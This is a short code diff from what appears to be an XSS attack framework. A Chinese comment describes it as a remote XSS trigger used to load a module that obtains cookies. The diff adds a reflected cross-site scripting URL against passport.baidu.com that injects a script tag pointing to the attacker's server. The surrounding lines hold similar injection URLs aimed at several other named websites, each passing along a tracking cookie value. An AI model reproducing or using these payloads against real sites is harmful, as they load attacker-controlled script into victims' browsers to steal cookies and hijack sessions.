@@ -18,6 +18,7 @@ if ( anehtaBrowser.type() == "msie" ){
     frameMark = anehta.dom.getCookie("anehtaWatermark");  	
     var ClxMod = anehtaurl + "/module/clx.js";
 	  var target_url = new Array( // 远程xss trigger; 这里只在远程加载clxmod以获取cookie.
+	                       "http://passport.baidu.com/?getmypass&username=\"];document.write('<script src="+ClxMod+"></script>');//"+"&anehtaWatermark="+frameMark,
 	                       "http://www.gobolinux.org/?page=<script src="+ClxMod+"></script>"+"&anehtaWatermark="+frameMark,
 	                       "http://www.underwoodlandcompany.com/?pg=asdf<script src="+ClxMod+"></script>"+"&anehtaWatermark="+frameMark,
 	                       "http://www.waikikicondosearch.com/?pg=asdf<script src="+ClxMod+"></script>"+"&anehtaWatermark="+frameMark
